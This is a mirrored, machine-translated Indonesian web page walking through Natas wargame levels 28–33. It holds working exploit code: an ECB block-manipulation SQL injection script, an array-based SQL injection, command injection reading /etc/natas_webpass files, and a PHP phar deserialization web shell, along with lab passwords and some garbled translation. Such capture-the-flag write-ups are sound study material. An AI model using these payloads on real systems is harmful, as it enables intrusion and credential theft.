<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🏇🏼 👨🏿‍🔧 🔢 Natas Web. Passage dari platform KKP bertujuan untuk mengeksploitasi kerentanan Web. Bagian 5 💩 😪 👏🏾</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Pada artikel ini, kita akan membahas operasi beberapa identitas WEB menggunakan wargame Natas sebagai contoh. Setiap level memiliki akses ke kata sand...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Natas Web. Passage dari platform KKP bertujuan untuk mengeksploitasi kerentanan Web. Bagian 5</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/465363/"><img src="https://habrastorage.org/webt/_-/zf/_u/_-zf_uvvs6ypsybfrqslsnqwx8k.png" alt="gambar"><br><br>  Pada artikel ini, kita akan membahas operasi beberapa identitas WEB menggunakan wargame <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Natas</a> sebagai contoh.  Setiap level memiliki akses ke kata sandi level selanjutnya.  Semua kata sandi juga disimpan di file / etc / natas_webpass /.  Sebagai contoh, kata sandi untuk natas5 disimpan dalam file / etc / natas_webpass / natas5 dan hanya-baca untuk pengguna natas4 dan natas5. <br><br>  Bagian sebelumnya: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">bagian 1</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">bagian 2</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">bagian 3</a> dan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">bagian 4</a> . <br><a name="habracut"></a><br><div class="spoiler">  <b class="spoiler_title">Informasi Organisasi</b> <div class="spoiler_text">  Terutama bagi mereka yang ingin mempelajari sesuatu yang baru dan berkembang di bidang informasi dan keamanan komputer, saya akan menulis dan berbicara tentang kategori berikut: <br><br><ul><li>  PWN; </li><li>  kriptografi (Crypto); </li><li>  teknologi jaringan (Jaringan); </li><li>  membalikkan (Reverse Engineering); </li><li>  steganografi (Stegano); </li><li>  pencarian dan eksploitasi kerentanan WEB. </li></ul><br>  Selain itu, saya akan membagikan pengalaman saya dalam forensik komputer, analisis malware dan firmware, serangan pada jaringan nirkabel dan jaringan area lokal, melakukan pentest dan menulis eksploitasi. <br><cut></cut><br>  Agar Anda dapat mengetahui tentang artikel baru, perangkat lunak, dan informasi lainnya, saya membuat <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">saluran di Telegram</a> dan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">grup untuk membahas masalah apa pun</a> di bidang ICD.  Juga, saya pribadi akan mempertimbangkan permintaan pribadi Anda, pertanyaan, saran dan rekomendasi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">secara pribadi dan akan menjawab semua orang</a> . <br><br>  Semua informasi disediakan hanya untuk tujuan pendidikan.  Penulis dokumen ini tidak bertanggung jawab atas kerusakan yang disebabkan seseorang sebagai akibat dari menggunakan pengetahuan dan metode yang diperoleh sebagai hasil dari mempelajari dokumen ini. <br></div></div><br><h2>  level 28 </h2><br>  Mengirim permintaan apa pun, kami melihat pengalihan ke halaman lain dengan permintaan aneh dan pengkodean base64, yang dekode tidak memberikan apa-apa. <br><br><img src="https://habrastorage.org/webt/cf/zj/qx/cfzjqxoth5dlerlwy-jstxfyd3a.png" alt="gambar"><br><br>  Kami akan mengirimkan permintaan apa pun ke kueri.  Kami mendapatkan kesalahan yang memperjelas bahwa pengalihan menggunakan enkripsi dan pada halaman ini permintaan didekripsi sebelum dipindahkan ke database.  Artinya, kita perlu Mengenkripsi injeksi kita dan mengirimkannya ke server, tetapi kita tidak tahu kuncinya.  Tetapi kami memiliki seorang penyandi - ini adalah server. <br><br><img src="https://habrastorage.org/webt/qr/pu/ox/qrpuox4rcgdtxne4znoewsryctm.png" alt="gambar"><br><br>  Pertama, mari kita berurusan dengan enkripsi.  Kami akan mengirimkan dua baris berbeda "qwerty" dan "asdfgh" dan menganalisis bagaimana mereka akan dikonversi. <br><br><img src="https://habrastorage.org/webt/7h/d4/yh/7hd4yh_jjeypqqz69jn2eimnrnc.png" alt="gambar"><br><br>  Sebagai tanggapan, kita mendapatkan garis identik, yang di tempat tertentu memiliki urutan berbeda.  Karena awal dan akhir dua PC (teks sandi) adalah sama, kita dapat menarik kesimpulan berikut: <br><br><ul><li>  Pelengkap awal untuk PL digunakan (plaintext); </li><li>  ada tambahan akhir untuk PL; </li><li>  Mode <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">ECB</a> digunakan, karena pada PL yang berbeda blok terakhir dari CT adalah sama, yaitu, blok independen satu sama lain. </li></ul><cut></cut><br>  Idenya adalah ini: kami mengirim permintaan ke database untuk enkripsi, tetapi akan dikonversi dan oleh karena itu, ketika mendekripsi, injeksi tidak akan berlalu.  Kita perlu berurusan dengan add-on untuk secara akurat menghitung blok tempat muatan kita akan dienkripsi.  Kemudian setelah enkripsi, kami akan mengambil blok kami dari permintaan dan hanya mengirimkannya ke server.  Di server mereka akan didekripsi dan, karena mereka tanpa add-on, dieksekusi. <br><br>  Idenya disajikan dalam empat gambar: <br><br><ol><li>  Presentasi 5 blok. </li><li>  Encoder dengan penambahan awal dan akhir yang mengenkripsi string kosong. </li><li>  Enkripsi string "TEXTTEXTTEXTTEXT". </li><li>  Kami menyingkirkan penambahan dengan menambahkan jumlah karakter yang diperlukan sebelum dan sesudah baris kami untuk meletakkannya di blok terpisah.  Kami hanya mengambil dari PC blok kedua. </li></ol><br><img src="https://habrastorage.org/webt/6x/az/z6/6xazz648f0cgitqajlo-m7eksi0.png" alt="gambar"><br><br>  Dengan cara ini, kami hanya menerima string terenkripsi kami pada kunci yang tidak diketahui bagi kami !!! <br><br>  Data yang Dibutuhkan: <br><br><ol><li>  Mode Enkripsi (Diketahui - ECB) </li><li>  Panjang blok (diketahui - 16) </li><li>  <b>Panjang add-on awal (tidak diketahui)</b> </li><li>  Panjang teks kita (dikenal - “PILIH kata sandi <br>  SAYA bercanda DARI pengguna ") </li></ol><br>  Perlu untuk mengetahui panjang pengisian awal.  Karena dua blok pertama sama, kami akan mengirim sejumlah karakter yang berbeda, dan segera setelah blok ketiga berhenti berubah, kami akan menemukan jumlah karakter yang diperlukan untuk melengkapinya.  Ini adalah 10 karakter.  Di bawah ini adalah implementasi dari algoritma di atas. <br><br><pre><code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> base64 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> requests <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> urlparse <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> urlsplit <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> urllib2 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> unquote <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ChiperQuery</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(url, auth, query)</span></span></span><span class="hljs-function">:</span></span> resp = requests.post(url, auth=auth, data={<span class="hljs-string"><span class="hljs-string">'query'</span></span>: query}) query_param = unquote(urlsplit(resp.url)[<span class="hljs-number"><span class="hljs-number">3</span></span>][<span class="hljs-number"><span class="hljs-number">6</span></span>:]) byte_decode_query = bytearray(base64.b64decode(query_param)) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> byte_decode_query <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">SendPayload</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(url, auth, payload)</span></span></span><span class="hljs-function">:</span></span> enc_payload = base64.b64encode(bytes(payload)) ret = requests.get(url + <span class="hljs-string"><span class="hljs-string">'/search.php'</span></span>, auth=auth, params={<span class="hljs-string"><span class="hljs-string">'query'</span></span>: enc_payload}) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> ret.text url = <span class="hljs-string"><span class="hljs-string">"http://natas28.natas.labs.overthewire.org/"</span></span> auth = requests.auth.HTTPBasicAuth(<span class="hljs-string"><span class="hljs-string">"natas28"</span></span>, <span class="hljs-string"><span class="hljs-string">"JWwR438wkgTsNKBbcJoowyysdM82YjeF"</span></span>) query = <span class="hljs-string"><span class="hljs-string">"SELECT password AS joke FROM users"</span></span> query += <span class="hljs-string"><span class="hljs-string">" "</span></span> * (<span class="hljs-number"><span class="hljs-number">16</span></span>-len(query)%<span class="hljs-number"><span class="hljs-number">16</span></span>) plaintext = <span class="hljs-string"><span class="hljs-string">'b'</span></span>*<span class="hljs-number"><span class="hljs-number">10</span></span> + query + chr(<span class="hljs-number"><span class="hljs-number">16</span></span>)*<span class="hljs-number"><span class="hljs-number">16</span></span> chip_query = ChiperQuery(url, auth, plaintext) st_pos = len(query) count = st_pos+<span class="hljs-number"><span class="hljs-number">16</span></span> result = SendPayload(url, auth, chip_query[st_pos:st_pos+count]) print(result)</code> </pre> <br><img src="https://habrastorage.org/webt/hr/7g/jr/hr7gjrd3jg6_nqv_luh8pg1l7fm.png" alt="gambar"><br><br>  Kami mendapatkan kata sandi. <br><br><h2>  level 29 </h2><br>  Sulit untuk menebak bahwa kode perl memanggil fungsi baris perintah dan meneruskan perintah yang ditentukan dalam file data (yang dapat Anda pilih) ke perintah.  Faktanya adalah bahwa kita dapat menutup pipa dari "exec |  read_command_file "in" exec |  read_command |  perintah our_smd_. " <br><br><img src="https://habrastorage.org/getpro/habr/post_images/a21/389/622/a21389622a7c7611aed78ae6678fd996.png" alt="gambar"><br><br>  Tetapi kenyataannya adalah bahwa tim kami akan ditampilkan di konsol, dan bukan di situs.  Untuk melakukan ini, tambahkan perintah berikut untuk mengganti karakter di input / output stream: “|  tr `sebelum` setelah`. <br><br><img src="https://habrastorage.org/webt/f3/rw/ry/f3rwrykfdv8obdr3cx1huxxissy.png" alt="gambar"><br><br>  Karena perintah sudah selesai, kami akan membaca kata sandi dari file yang ditentukan.  Tetapi kita diberitahu bahwa kita tidak dapat melakukan ini ... <br><br><img src="https://habrastorage.org/webt/f3/rw/ry/f3rwrykfdv8obdr3cx1huxxissy.png" alt="gambar"><br><br>  Kami akan menggunakan pemfilteran baris perintah dan menyisipkan tanda kutip di sembarang tempat yang akan dihapus ketika perintah dieksekusi. <br><br><img src="https://habrastorage.org/webt/1h/a-/2-/1ha-2-9b0klpqpjytwvshd_6n7u.png" alt="gambar"><br><br>  Kami mengambil kata sandi. <br><br><h2>  level 30 </h2><br>  Mari kita lihat kode sumbernya.  Metode quote () digunakan di sini, yang lolos dari semua karakter khusus dalam sebuah string.  Tapi itu lolos tepat dalam string, yang memberi kita hak untuk mengoperasikan injeksi, jika kita menggunakan, misalnya, sebuah array (dalam hal ini, elemen nol akan diterima). <br><br><img src="https://habrastorage.org/webt/6r/2u/zq/6r2uzq4fn67dpsswpqhqihjtuna.png" alt="gambar"><br><br>  Mari kita datang dengan memuat permintaan <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">Select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> username = <span class="hljs-string"><span class="hljs-string">'username'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> = <span class="hljs-string"><span class="hljs-string">'password'</span></span>;</code> </pre> <br>  Karena kami tahu nama pengguna adalah natas31, kami memperkenalkan kondisi yang benar ke dalam kata sandi: '' atau 1. Kemudian permintaan kami akan menjadi seperti ini <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">Select</span></span> * <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> <span class="hljs-keyword"><span class="hljs-keyword">users</span></span> <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> username = <span class="hljs-string"><span class="hljs-string">'natas31'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> = <span class="hljs-string"><span class="hljs-string">''</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>;</code> </pre> <br>  Dan sekarang tetap mengirim array. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> requests url = <span class="hljs-string"><span class="hljs-string">"http://natas30.natas.labs.overthewire.org/index.pl"</span></span> s = requests.Session() s.auth = (<span class="hljs-string"><span class="hljs-string">'natas30'</span></span>, <span class="hljs-string"><span class="hljs-string">'wie9iexae0Daihohv8vuu3cei9wahf0e'</span></span>) args = { <span class="hljs-string"><span class="hljs-string">"username"</span></span>: <span class="hljs-string"><span class="hljs-string">"natas31"</span></span>, <span class="hljs-string"><span class="hljs-string">"password"</span></span>: [<span class="hljs-string"><span class="hljs-string">"'' or 1"</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>] } r = s.post(url, data=args) print(r.text)</code> </pre> <br><img src="https://habrastorage.org/webt/k6/wz/l8/k6wzl8ddxaiazmonwchc3yqa6q8.png" alt="gambar"><br><br>  Kami mengambil kata sandi. <br><br><h2>  level 31 </h2><br>  Inti dari layanan segera menjadi jelas: dari file csv kita dapatkan tabel dalam html. <br><br><img src="https://habrastorage.org/webt/lu/gy/ob/lugyobitqxvszjjwdv8mgyzze6a.png" alt="gambar"><br><br>  Mari kita lihat kode sumbernya. <br><br><img src="https://habrastorage.org/webt/72/h7/jn/72h7jnap6hzndui_h8p_wye_3ku.png" alt="gambar"><br><br>  Jadi, apa yang paling menarik: ini adalah baris while (&lt;$ file&gt;), sedangkan file adalah baris dari parameter.  Dengan demikian, dimungkinkan untuk mengeksekusi kode. <br><br><img src="https://habrastorage.org/webt/hl/lm/yc/hllmyc4nlzsuw5-wzhh1airgewa.png" alt="gambar"><br><br>  Kirim file csv apa pun dan potong permintaan di Burp Suite. <br><br><img src="https://habrastorage.org/webt/hl/lm/yc/hllmyc4nlzsuw5-wzhh1airgewa.png" alt="gambar"><br><br>  Sekarang mari kita tambahkan perintah sebagai parameter. <br><pre> <code class="bash hljs">?/bin/cat%20/etc/natas_webpass/natas32%20|</code> </pre> <br><br><img src="https://habrastorage.org/webt/se/b9/pz/seb9pziilk6q0nyxsnucujmsx1w.png" alt="gambar"><br><br>  Untuk memanggil pemuatan dari parameter, tambahkan baris berikut: <br><br><pre> <code class="plaintext hljs">-----------------------------716973545450730846281908502 Content-Disposition: form-data; name="file"; Content-Type: text/csv ARGV</code> </pre> <br><img src="https://habrastorage.org/webt/-n/fl/ml/-nflmldwytfowae7hvsi8m02fl8.png" alt="gambar"><br><br><img src="https://habrastorage.org/webt/7k/dx/rd/7kdxrdmfwgzlbbkdyuxt3rstck4.png" alt="gambar"><br><br>  Kami mendapatkan kata sandi. <br><br><h2>  level 32 </h2><br>  Kami membuka halaman di mana kami diberitahu bahwa kami perlu membuktikan eksekusi kode dan mengeksekusi file webroot. <br><br><img src="https://habrastorage.org/webt/eg/it/df/egitdfbigqtdo792neb11yw39o8.png" alt="gambar"><br><br>  Jika Anda melihat kode, itu persis sama dengan di level sebelumnya.  Kemudian kami mengeksploitasi kerentanan seperti terakhir kali.  Mari kita cari file webroot.  Untuk melakukan ini, lihat direktori, gunakan sebagai beban: ls -la | <br><br><img src="https://habrastorage.org/webt/a-/uy/el/a-uyelts3nbtxtzohnb0hte-t0o.png" alt="gambar"><br><br>  Dapatkan daftar file.  Webroot tidak ada di sana, tetapi ada kata sandi program aneh. <br>  Kami melaksanakannya. <br><br><img src="https://habrastorage.org/webt/iv/iv/8f/iviv8f54cgrlx9j_glp770jng5g.png" alt="gambar"><br><br><img src="https://habrastorage.org/webt/jz/3j/ok/jz3jok9oavuzhsr3iqric_wodfi.png" alt="gambar"><br><br>  Kami mendapatkan kata sandi untuk level terakhir. <br><br><img src="https://habrastorage.org/webt/dk/wm/vg/dkwmvgv2nnaaahnlnbbfcr97beo.png" alt="gambar"><br><br><h2>  level 33 </h2><br>  Sekali lagi formulir unggah file. <br><br><img src="https://habrastorage.org/webt/mr/e4/hq/mre4hqlkvws3uidhslqgmgvu3va.png" alt="gambar"><br><br>  Mari kita lihat kode sumbernya. <br><br><img src="https://habrastorage.org/webt/-f/co/l9/-fcol9z_26on8wkfft6ndoktpny.png" alt="gambar"><br><br>  Jadi, kita harus mengunggah file hingga 4 MB dalam ukuran ke server dan jika md5 dari isi file sama dengan nilai referensi, itu akan dieksekusi di php interpreter.  Kami melihat lebih jauh.  Kita dapat mengontrol nama file dan isinya. <br><br><img src="https://habrastorage.org/webt/-e/lm/0g/-elm0gr1nbqnwi7wrm8sazsdcdy.png" alt="gambar"><br><br>  Saya akan segera mengatakan bahwa ini adalah kerentanan kompleks yang saya temui setengah tahun yang lalu.  Ini ditujukan pada kenyataan bahwa kita dapat mengunggah file jenis apa pun ke server dan operasi apa pun akan dilakukan dengan kontennya.  Tentang file phar ditulis di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> .  Singkatnya, arsip php khusus mewakili data serial.  Dalam hal ini, membaca aliran phar akan mengarah pada pelaksanaan kode.  Dengan demikian, Anda dapat membuat serial kode dan mengirimkannya ke server.  Saat menghitung md5, aliran akan dibaca - yang akan mengarah pada eksekusi kode. <br><br>  Jadi pertama-tama buat file php yang bertuliskan flag. <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> shell_exec(<span class="hljs-string"><span class="hljs-string">'cat /etc/natas_webpass/natas34'</span></span>); <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> <br>  Unggah ke server.  Jangan lupa untuk mengubah nama di Burp Suite. <br><br><img src="https://habrastorage.org/webt/d9/uk/v5/d9ukv57ubafrgtsvr5now1xevao.png" alt="gambar"><br><br><img src="https://habrastorage.org/webt/fp/3q/3c/fp3q3cisij3xvyjy6qnzgq0efjc.png" alt="gambar"><br><br>  Kami mendapat respons server ... Oke.  Sekarang kita akan membuat arsip phar, yang, ketika dijalankan, akan mengubah nilai yang kita butuhkan (hash akan selalu benar dan nama file yang telah diunggah ke server).  Jadi kami akan melewati pemeriksaan dan server akan menjalankan shell.php. <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Shell</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> $filename = <span class="hljs-string"><span class="hljs-string">"shell.php"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> $signature = <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> $init = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; } $phar = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Phar(<span class="hljs-string"><span class="hljs-string">"shell.phar"</span></span>); $phar-&gt;startBuffering(); $phar-&gt;addFromString(<span class="hljs-string"><span class="hljs-string">"123.txt"</span></span>, <span class="hljs-string"><span class="hljs-string">'123'</span></span>); $phar-&gt;setStub(<span class="hljs-string"><span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span></span>); $s = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Shell(); $phar-&gt;setMetadata($s); $phar-&gt;stopBuffering(); <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> <br>  Sebelum mengkompilasi dalam file /etc/php/xx/php.ini, Anda perlu mengubah parameter phar.readonly ke Off. <br><br><img src="https://habrastorage.org/webt/5b/-f/wn/5b-fwntum8gegivytyszgod64j8.png" alt="gambar"><br><br>  Selanjutnya, jalankan php shell.php dan kita dapatkan file .phar.  Kami mengirimkannya ke server dan mengubah nama. <br><br><img src="https://habrastorage.org/webt/wr/mj/vh/wrmjvhey7hmfmlq9lpfgd8bylau.png" alt="gambar"><br><br>  Jadi kami memiliki kedua file: arsip dan shell.  Sekarang Anda perlu membuat file dibaca dari arsip, yang akan menyebabkan eksekusi kode. <br><br><img src="https://habrastorage.org/webt/yb/4w/id/yb4widil1bd9xhjzw0cdmgnjsns.png" alt="gambar"><br><br>  Kami mendapatkan kata sandi. <br><br><img src="https://habrastorage.org/webt/jc/9w/oy/jc9woyxlkl8wk6wakkwzxbqzmcg.png" alt="gambar"><br><br>  Itu adalah tempat Natas.  Anda dapat bergabung dengan kami di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Telegram</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id465363/">https://habr.com/ru/post/id465363/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id465353/index.html">Audit Keamanan ICS</a></li>
<li><a href="../id465355/index.html">Ketika 'a' tidak sama dengan 'a'. Setelah satu retasan</a></li>
<li><a href="../id465357/index.html">Seleksi: 9 materi bermanfaat tentang emigrasi "profesional" ke AS</a></li>
<li><a href="../id465359/index.html">Huawei CloudCampus: infrastruktur layanan cloud tinggi</a></li>
<li><a href="../id465361/index.html">Perempatan digital Kazan: bagaimana teknologi keselamatan jalan diperkenalkan di kota</a></li>
<li><a href="../id465365/index.html">Skrip pengaturan Windows 10</a></li>
<li><a href="../id465367/index.html">Siapa yang tidak menyembunyikan - Saya tidak bisa disalahkan (sejarah kerahasiaan dalam penerbangan)</a></li>
<li><a href="../id465369/index.html">Weight-Insensitive Neural Networks (WANN)</a></li>
<li><a href="../id465371/index.html">Perhitungan hipotesis nol, misalnya, analisis gaji programmer Ukraina</a></li>
<li><a href="../id465373/index.html">Bukan review dari ASUS ZenBook Pro 15 UX580GE - hampir setahun dengan hampir teratas</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>